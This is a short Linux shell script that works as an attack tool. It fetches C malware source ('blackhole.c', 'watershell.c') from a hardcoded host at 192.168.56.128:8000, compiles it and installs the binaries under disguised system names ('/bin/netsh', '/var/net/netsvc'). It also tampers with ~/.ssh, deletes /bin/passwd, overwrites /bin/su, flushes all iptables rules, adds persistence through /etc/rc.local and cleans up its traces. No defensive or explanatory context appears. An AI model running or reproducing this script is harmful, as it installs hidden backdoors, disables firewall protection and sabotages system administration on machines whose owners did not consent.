ip="192.168.56.128"
port=8000
cat ~/tmp >> ~/.ssh/
rm -f ~/tmp
curl http://${ip}:${port}/mal/unix/blackhole.c -o /tmp/blackhole.c
gcc /tmp/blackhole.c
mv ./a.out /bin/netsh
netsh &
rm -f /tmp/blackhole.c
curl http://${ip}:${port}/mal/unix/watershell/watershell.c -o /tmp/watershell.c
curl http://${ip}:${port}/mal/unix/watershell/watershell.h -o /tmp/watershell.h
temp=`ip a | awk '{print $2}' | grep ^e | tr -d : | head -1`
sed -i "s/eth0/${temp}/" /tmp/watershell.c
gcc /tmp/watershell.c
if [ ! -d /var/net ]; then mkdir /var/net; fi
mv ./a.out /var/net/netsvc
/var/net/netsvc &
rm -f /tmp/watershell.*
rm -f /bin/passwd
cp /bin/ssh /bin/su
iptables -F
echo "netsh &" >> /etc/rc.local
unset ip
unset port
unset temp
